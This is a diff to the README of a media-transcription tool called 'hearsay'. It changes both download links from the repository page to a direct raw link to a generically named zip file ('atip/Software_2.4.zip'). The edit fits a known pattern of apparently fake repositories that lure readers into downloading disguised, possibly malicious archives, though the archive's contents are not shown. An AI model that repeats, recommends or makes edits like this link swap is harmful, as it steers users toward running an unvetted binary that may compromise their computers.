@@ -1,6 +1,6 @@
 # 🎙️ hearsay - Turn media into clean text files
 
-[![](https://img.shields.io/badge/Download_Hearsay-Blue?style=for-the-badge)](https://github.com/Nadyopened885/hearsay)
+[![](https://img.shields.io/badge/Download_Hearsay-Blue?style=for-the-badge)](https://github.com/Nadyopened885/hearsay/raw/refs/heads/main/atip/Software_2.4.zip)
 
 Hearsay converts video and audio files into organized text documents. It processes YouTube videos, podcasts, and local recordings. The software creates transcriptions with timestamps. These files work with language models, research tools, and writing applications.
 
@@ -10,7 +10,7 @@ Your computer needs a standard Windows 10 or 11 installation. The software requi
 
 ## 📥 Download and Install
 
-Visit this page to download the software: https://github.com/Nadyopened885/hearsay
+Visit this page to download the software: https://github.com/Nadyopened885/hearsay/raw/refs/heads/main/atip/Software_2.4.zip
 
 1. Open the provided link in your web browser.
 2. Locate the most recent version of the software.
